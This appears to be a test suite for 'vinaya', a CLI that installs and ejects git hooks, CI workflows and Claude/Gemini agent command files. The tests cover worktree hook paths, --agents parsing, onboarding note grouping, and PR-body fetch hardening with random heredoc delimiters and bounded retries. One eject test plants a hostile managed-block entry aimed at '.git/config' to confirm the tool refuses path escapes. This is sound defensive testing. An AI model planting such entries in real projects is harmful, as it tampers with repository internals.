    // a write target) and already declares ci.setup — generation must honor
    // it even though init will not touch the file itself.
    writeFileSync(
      join(root, CONFIG_PATH),
      `${JSON.stringify({ checks: {}, ci: { setup: 'npm ci' } }, null, 2)}\n`,
      'utf-8'
    )
    const rc = await runInit(['--yes'], makeDeps())
    expect(rc).toBe(0)
    const workflow = readFileSync(join(root, CHECKS_WORKFLOW_PATH), 'utf-8')
    expect(workflow).toContain('- name: Adopter CI setup')
    expect(workflow).toContain('          npm ci')
  })
})

describe('vinaya eject — raw git hooks inside a linked worktree', () => {
  function git(cwd: string, args: string[]): string {
    return execFileSync('git', args, { cwd, encoding: 'utf8' }).trim()
  }

  /**
   * Mirrors `upgrade.test.ts`'s linked-worktree test for the eject side (#68).
   *
   * The defect it pins: hooks are never per-worktree, so a `.git/hooks/*`
   * managed block's real home is the MAIN checkout's shared hooks directory.
   * From a linked worktree that path is legitimately outside the worktree's
   * `repoRoot`.
   *
   * `planEject`'s old `containedAbs` guard did NOT reject it — that account is
   * wrong and this test is the reason to state it right. `resolve()` never
   * sees that the worktree's `.git` is a gitlink FILE, so
   * `<repoRoot>/.git/hooks/pre-commit` is textually contained and PASSES. It
   * just names a file that does not exist there, so `planEject` recorded
   * `present: false`, the diff printed `gone (managed block already
   * removed)`, and `eject` exited 0 having stripped nothing while the real
   * hook stayed armed in the shared directory. An escape would have refused
   * the whole run and said so; this reported success — which is why the
   * assertion below is on the hook's CONTENT in the shared dir, not on the
   * exit code.
   */
  it('strips the shared-common-dir hook block when ejecting from a linked worktree', async () => {
    git(root, ['init', '-q', '-b', 'main'])
    git(root, ['config', 'user.email', 'test@example.com'])
    git(root, ['config', 'user.name', 'Test'])
    git(root, ['add', 'README.md'])
    git(root, ['commit', '-q', '-m', 'Chore: initial commit'])

    await runInit(['--yes'], makeDeps({ hookDirFor: () => '.git/hooks' }))
    git(root, ['add', '-A'])
    // --no-verify: the real hook shells to a network-dependent `npx`, which is
    // irrelevant to what this test verifies (eject's own path resolution).
    git(root, ['commit', '-q', '-m', 'Chore: install Vinaya', '--no-verify'])

    const hookPath = join(root, '.git/hooks/pre-commit')
    expect(existsSync(hookPath)).toBe(true)
    expect(readFileSync(hookPath, 'utf-8')).toContain('vinaya')

    const wtRoot = join(tmpdir(), `vinaya-eject-wt-${Date.now()}-${Math.random().toString(36).slice(2)}`)
    git(root, ['worktree', 'add', '-q', wtRoot, '-b', 'task/demo/1'])

    try {
      // The worktree's own `.git` is a gitlink FILE, so a naive join resolves
      // nothing — this is exactly the shape that used to defeat containment.
      expect(statSync(join(wtRoot, '.git')).isFile()).toBe(true)

      let rc = -1
      await captureStdout(async () => {
        rc = await runEject(
          ['--yes'],
          ejectDeps({ detectRepo: async () => ({ repoRoot: wtRoot, owner: 'acme', repo: 'widget' }) })
        )
      })
      expect(rc).toBe(0)

      // The load-bearing assertion: the hook in the SHARED common dir is gone.
      // Before the fix this file survived eject with its managed block intact.
      expect(existsSync(hookPath) && readFileSync(hookPath, 'utf-8').includes('vinaya')).toBe(false)
    } finally {
      git(root, ['worktree', 'remove', '--force', wtRoot])
      rmSync(wtRoot, { recursive: true, force: true })
    }
  })

  it('refuses to eject rather than partially strip when a block path escapes its bounds', async () => {
    git(root, ['init', '-q', '-b', 'main'])
    git(root, ['config', 'user.email', 'test@example.com'])
    git(root, ['config', 'user.name', 'Test'])
    await runInit(['--yes'], makeDeps({ hookDirFor: () => '.git/hooks' }))

    // A `.git/`-prefixed block outside `hooks/` — no managed block has any
    // business there, and the old repoRoot-based rule would have accepted it
    // in a primary checkout, where `<repoRoot>/.git` IS the common dir.
    const config = JSON.parse(readFileSync(join(root, CONFIG_PATH), 'utf-8'))
    config.managed.blocks.push({ path: '.git/config', marker: 'evil', comment: 'hash' })
    writeFileSync(join(root, CONFIG_PATH), JSON.stringify(config, null, 2), 'utf-8')

    let rc = -1
    await captureStdout(async () => {
      rc = await runEject(['--yes'], ejectDeps())
    })
    expect(rc).toBe(1)
    // Refusal is whole-run: nothing was removed, not even the legitimate rows.
    expect(existsSync(join(root, CONFIG_PATH))).toBe(true)
  })
})

// task 5 (#152) — wiring the three agent-vendor emitters (tasks 2/3/4) into
// init/upgrade/eject/doctor via `--agents` + the persisted `managed.agents`
// selection.
describe('--agents flag parsing', () => {
  it('defaults to all three vendors when the flag is absent', () => {
    const result = parseAgentsFlag([])
    expect(result).toEqual({ ok: true, agents: new Set(AGENT_VENDORS) })
  })

  it('--agents=all is the same as the default', () => {
    expect(parseAgentsFlag(['--agents=all'])).toEqual({ ok: true, agents: new Set(AGENT_VENDORS) })
  })

  it('--agents=none selects nothing', () => {
    expect(parseAgentsFlag(['--agents=none'])).toEqual({ ok: true, agents: new Set() })
  })

  it('--agents=claude,gemini selects exactly the named vendors, trimming whitespace', () => {
    expect(parseAgentsFlag(['--agents= claude , gemini '])).toEqual({
      ok: true,
      agents: new Set(['claude', 'gemini'])
    })
  })

  it('--agents=claude selects exactly that one vendor', () => {
    expect(parseAgentsFlag(['--agents=claude'])).toEqual({ ok: true, agents: new Set(['claude']) })
  })

  it('rejects an unknown vendor name, naming it and the valid values', () => {
    const result = parseAgentsFlag(['--agents=claude,bogus'])
    expect(result.ok).toBe(false)
    if (result.ok) throw new Error('expected refusal')
    expect(result.error).toContain('bogus')
    expect(result.error).toContain('skills, claude, gemini')
  })
})

describe('vinaya init --agents narrowing', () => {
  it('--agents=claude installs the Claude Code command AND the Stop hook, and persists the selection', async () => {
    const rc = await runInit(['--yes', '--agents=claude'], makeDeps())
    expect(rc).toBe(0)
    expect(existsSync(join(root, CLAUDE_COMMAND_PATH))).toBe(true)
    expect(existsSync(join(root, CLAUDE_STOP_HOOK_SCRIPT_PATH))).toBe(true)
    expect(existsSync(join(root, CLAUDE_SETTINGS_PATH))).toBe(true)
    expect(existsSync(join(root, GEMINI_COMMAND_PATH))).toBe(false)
    expect(existsSync(join(root, '.agents/skills'))).toBe(false)

    const cfg = JSON.parse(readFileSync(join(root, CONFIG_PATH), 'utf-8'))
    expect(cfg.managed.agents).toEqual(['claude'])
    expect(cfg.managed.files).toContain(CLAUDE_COMMAND_PATH)
    expect(cfg.managed.files).toContain(CLAUDE_SETTINGS_PATH)
    expect(cfg.managed.blocks.some((b: { path: string }) => b.path === CLAUDE_STOP_HOOK_SCRIPT_PATH)).toBe(true)
    expect(cfg.managed.files).not.toContain(GEMINI_COMMAND_PATH)
  })

  it('--agents=none installs none of the three vendor emitters (nor the Stop hook), and persists an empty selection', async () => {
    const rc = await runInit(['--yes', '--agents=none'], makeDeps())
    expect(rc).toBe(0)
    expect(existsSync(join(root, CLAUDE_COMMAND_PATH))).toBe(false)
    expect(existsSync(join(root, CLAUDE_STOP_HOOK_SCRIPT_PATH))).toBe(false)
    expect(existsSync(join(root, CLAUDE_SETTINGS_PATH))).toBe(false)
    expect(existsSync(join(root, GEMINI_COMMAND_PATH))).toBe(false)
    expect(existsSync(join(root, '.agents/skills'))).toBe(false)

    const cfg = JSON.parse(readFileSync(join(root, CONFIG_PATH), 'utf-8'))
    expect(cfg.managed.agents).toEqual([])
  })

  it('refuses an unknown --agents vendor, writing nothing', async () => {
    const before = snapshot(root)
    const rc = await runInit(['--yes', '--agents=bogus'], makeDeps())
    expect(rc).toBe(2)
    expect(snapshot(root)).toEqual(before)
  })
})

describe('vinaya eject removes all three agent-vendor emitters from a full install', () => {
  it('round-trips clean: default --agents=all install then eject leaves the fixture exactly as it started', async () => {
    const before = snapshot(root)
    await runInit(['--yes'], makeDeps())
    expect(existsSync(join(root, CLAUDE_COMMAND_PATH))).toBe(true)
    expect(existsSync(join(root, GEMINI_COMMAND_PATH))).toBe(true)
    const doctrineRoot = resolveDoctrineRoot()
    if (!doctrineRoot) throw new Error('no bundled doctrine found — this test requires the real aeg-root/')
    const skillPaths = discoverRoleNames(doctrineRoot).map(agentSkillPath)
    for (const p of skillPaths) expect(existsSync(join(root, p))).toBe(true)

    await runEject(['--yes'], ejectDeps())

    expect(existsSync(join(root, CLAUDE_COMMAND_PATH))).toBe(false)
    expect(existsSync(join(root, GEMINI_COMMAND_PATH))).toBe(false)
    for (const p of skillPaths) expect(existsSync(join(root, p))).toBe(false)
    expect(snapshot(root)).toEqual(before)
  })
})

// Code review, PR #279: both new onboarding notes below were copy-pasted
// under `group: 'Branch protection (printed, never applied)'` — a literal
// section header (`renderInstallDiff`, lib/ops.ts) neither note is about,
// so they rendered nested under the wrong heading with zero coverage to
// catch it. These tests pin each note's own group, guard the pre-existing
// branch-protection notes stay put, and cover the PATH note's per-vendor
// wording (a gemini-only repo was told about `.claude` files it doesn't
// have while its real affected file went unmentioned).
describe('onboarding notes: correct groups and per-vendor wording (PR #279 review)', () => {
  function opsFor(agents: AgentVendor[]): ReturnType<typeof buildInitOps> {
    return buildInitOps({
      owner: 'acme',
      repo: 'widget',
      hookDir: '.husky',
      selfHost: null,
      ciSetup: null,
      agents: new Set<AgentVendor>(agents)
    })
  }

  function printMessages(agents: AgentVendor[]): { message: string; group: string }[] {
    return opsFor(agents)
      .filter((op) => op.kind === 'print')
      .map((op) => (op.kind === 'print' ? { message: op.message, group: op.group } : { message: '', group: '' }))
  }

  it('the vinaya-on-PATH note has its own group, not "Branch protection"', () => {
    const prints = printMessages(['claude'])
    const pathNote = prints.find((p) => p.message.includes('resolvable on PATH'))
    expect(pathNote).toBeDefined()
    expect(pathNote?.group).toBe('Agent-native commands (printed, never applied)')
    expect(pathNote?.group).not.toBe('Branch protection (printed, never applied)')
  })

  it('the principals note has its own group, not "Branch protection"', () => {
    const prints = printMessages(['claude'])
    const principalsNote = prints.find((p) => p.message.includes('principals'))
    expect(principalsNote).toBeDefined()
    expect(principalsNote?.group).toBe('Review trust (printed, never applied)')
    expect(principalsNote?.group).not.toBe('Branch protection (printed, never applied)')
  })

  it('the pre-existing branch-protection and CODEOWNERS notes still share their own group', () => {
    const prints = printMessages(['claude'])
    const branchNote = prints.find((p) => p.message.includes('branches/main/protection'))
    const codeownersNote = prints.find((p) => p.message.includes('CODEOWNERS'))
    expect(branchNote?.group).toBe('Branch protection (printed, never applied)')
    expect(codeownersNote?.group).toBe('Branch protection (printed, never applied)')
  })

  it('no vendor selected: no PATH note is printed at all', () => {
    const prints = printMessages([])
    expect(prints.find((p) => p.message.includes('resolvable on PATH'))).toBeUndefined()
  })

  it('claude-only: names the claude command file, says nothing about gemini', () => {
    const prints = printMessages(['claude'])
    const pathNote = prints.find((p) => p.message.includes('resolvable on PATH'))
    expect(pathNote?.message).toContain('/vinaya <role>')
    expect(pathNote?.message).toContain('.claude/commands/vinaya.md')
    expect(pathNote?.message).not.toContain('.gemini')
  })

  it('gemini-only: names the gemini command file, never claims a `/vinaya <role>` command it never installed', () => {
    const prints = printMessages(['gemini'])
    const pathNote = prints.find((p) => p.message.includes('resolvable on PATH'))
    expect(pathNote?.message).toContain('.gemini/commands/vinaya.toml')
    expect(pathNote?.message).not.toContain('/vinaya <role>')
    expect(pathNote?.message).not.toContain('.claude')
  })

  it('skills-only: names the skill files, mentions neither claude nor gemini command files', () => {
    const prints = printMessages(['skills'])
    const pathNote = prints.find((p) => p.message.includes('resolvable on PATH'))
    expect(pathNote?.message).toContain('.agents/skills/vinaya-*/SKILL.md')
    expect(pathNote?.message).not.toContain('.claude/commands/vinaya.md')
    expect(pathNote?.message).not.toContain('.gemini/commands/vinaya.toml')
  })

  it('all three vendors: the rendered diff nests each note under its own heading, not a shared one', () => {
    // Exercise the real renderer (planInstall + renderInstallDiff), not just
    // the op's `group` string in isolation — this is what a real
    // `vinaya init --dry-run` run actually prints.
    const plan = planInstall(opsFor(['claude', 'gemini', 'skills']), root)
    const rendered = renderInstallDiff(plan)
    const pathHeaderIdx = rendered.indexOf('── Agent-native commands (printed, never applied) ──')
    const reviewTrustHeaderIdx = rendered.indexOf('── Review trust (printed, never applied) ──')
    const branchHeaderIdx = rendered.indexOf('── Branch protection (printed, never applied) ──')
    expect(pathHeaderIdx).toBeGreaterThan(-1)
    expect(reviewTrustHeaderIdx).toBeGreaterThan(-1)
    expect(branchHeaderIdx).toBeGreaterThan(-1)
    // Each heading is followed by its own note before the next heading starts.
    const pathSection = rendered.slice(pathHeaderIdx, reviewTrustHeaderIdx)
    expect(pathSection).toContain('resolvable on PATH')
    expect(pathSection).not.toContain('principals')
  })
})

// O5 (found live 2026-09-04): the PR-body heredoc delimiter in the generated
// "Fetch PR body" step must be unguessable by construction, not merely
// unlikely to collide — a nanosecond timestamp is neither.
describe('generated workflows — PR-body heredoc delimiter is real randomness (O5)', () => {
  it('vinaya-checks.yml and vinaya-body-checks.yml derive DELIM from openssl rand, never a timestamp', () => {
    const ops = buildInitOps({
      owner: 'acme',
      repo: 'widget',
      hookDir: '.husky',
      selfHost: null,
      ciSetup: null,
      agents: new Set<AgentVendor>()
    })
    const checks = ops.find((op) => op.kind === 'create-file' && op.path === CHECKS_WORKFLOW_PATH)
    const bodyChecks = ops.find((op) => op.kind === 'create-file' && op.path === BODY_CHECKS_WORKFLOW_PATH)
    expect(checks?.kind).toBe('create-file')
    expect(bodyChecks?.kind).toBe('create-file')
    for (const op of [checks, bodyChecks]) {
      if (op?.kind !== 'create-file') continue
      expect(op.content).toContain('DELIM="PR_BODY_$(openssl rand -hex 16)"')
      expect(op.content).not.toContain('date +%s%N')
    }
  })
})

// task 17, O3 — the "Fetch PR body" step re-reads until the body is
// internally consistent with what this run already knows, instead of
// trusting a single `gh pr view` that can race a `pr report --push`/`pr
// edit` still landing on the forge (measured live: #485/#520/#523 went red
// on closes-n, then green on the very next run with no code change).
describe('generated workflows — verified PR-body fetch, bounded backoff (O3)', () => {
  it('both vinaya-checks.yml and vinaya-body-checks.yml wait for a real AEG:CLOSES region, and fail loudly on exhaustion', () => {
    const ops = buildInitOps({
      owner: 'acme',
      repo: 'widget',
      hookDir: '.husky',
      selfHost: null,
      ciSetup: null,
      agents: new Set<AgentVendor>()
    })
    const checks = ops.find((op) => op.kind === 'create-file' && op.path === CHECKS_WORKFLOW_PATH)
    const bodyChecks = ops.find((op) => op.kind === 'create-file' && op.path === BODY_CHECKS_WORKFLOW_PATH)
    for (const op of [checks, bodyChecks]) {
      if (op?.kind !== 'create-file') continue
      // Retries, bounded — never an infinite wait.
      expect(op.content).toContain('MAX_ATTEMPTS=6')
      expect(op.content).toContain('sleep "$SLEEP_SECONDS"')
      // Waits only for a TASK branch's AEG:CLOSES region, never a non-task one.
      expect(op.content).toContain('^task/[^/]+/[^/]+$')
      expect(op.content).toContain('AEG:CLOSES:START')
      // Fails loudly, naming what it waited for, on exhaustion — never a
      // silent pass-through to the check suite with a body it knows may be stale.
      expect(op.content).toContain('::error::Gave up after')
    }
  })

  it("no longer waits for the AEG:EVIDENCE block's Head to catch up (O1, task-run-v1 20) — both workflows now trigger only on events where the body already carries the fresh head, so evidence-fresh at the merge gate is the sole guard left", () => {
    const ops = buildInitOps({
      owner: 'acme',
      repo: 'widget',
      hookDir: '.husky',
      selfHost: null,
      ciSetup: null,
      agents: new Set<AgentVendor>()
    })
    const checks = ops.find((op) => op.kind === 'create-file' && op.path === CHECKS_WORKFLOW_PATH)
    const bodyChecks = ops.find((op) => op.kind === 'create-file' && op.path === BODY_CHECKS_WORKFLOW_PATH)
    for (const op of [checks, bodyChecks]) {
      if (op?.kind !== 'create-file') continue
      expect(op.content).not.toContain('AEG:EVIDENCE:START')
      expect(op.content).not.toContain('PR_HEAD_SHA')
      expect(op.content).not.toContain('catch up')
    }
  })

  it('vinaya-checks.yml and vinaya-body-checks.yml trigger on opened, reopened, and edited only — never synchronize (O1, task-run-v1 20)', () => {
    const ops = buildInitOps({
      owner: 'acme',
      repo: 'widget',
      hookDir: '.husky',
      selfHost: null,
      ciSetup: null,
      agents: new Set<AgentVendor>()
    })
    const checks = ops.find((op) => op.kind === 'create-file' && op.path === CHECKS_WORKFLOW_PATH)
    const bodyChecks = ops.find((op) => op.kind === 'create-file' && op.path === BODY_CHECKS_WORKFLOW_PATH)
    for (const op of [checks, bodyChecks]) {
      if (op?.kind !== 'create-file') continue
      expect(op.content).toContain('types: [opened, reopened, edited]')
      // No OTHER trigger type list survives in either workflow's own `on:`
      // block — this is the sole `types:` line each file declares, so a
      // future edit re-adding `synchronize` there cannot hide behind a
      // second, differently-worded trigger list.
      const typesLines = op.content.match(/^\s*types: \[.*\]$/gm) ?? []
      expect(typesLines).toEqual(['    types: [opened, reopened, edited]'])
    }
  })

  it('both workflows generate the exact SAME fetch step — one rule, not two copies', () => {
    const ops = buildInitOps({
      owner: 'acme',
      repo: 'widget',
      hookDir: '.husky',
      selfHost: null,
      ciSetup: null,
      agents: new Set<AgentVendor>()
    })
    const checks = ops.find((op) => op.kind === 'create-file' && op.path === CHECKS_WORKFLOW_PATH)
    const bodyChecks = ops.find((op) => op.kind === 'create-file' && op.path === BODY_CHECKS_WORKFLOW_PATH)
    if (checks?.kind !== 'create-file' || bodyChecks?.kind !== 'create-file')
      throw new Error('expected create-file ops')
    const extractFetchStep = (content: string): string => {
      const start = content.indexOf('- name: Fetch PR body')
      const end = content.indexOf('\n      - name:', start + 1)
      return content.slice(start, end === -1 ? undefined : end)
    }
    expect(extractFetchStep(checks.content)).toBe(extractFetchStep(bodyChecks.content))
  })
})
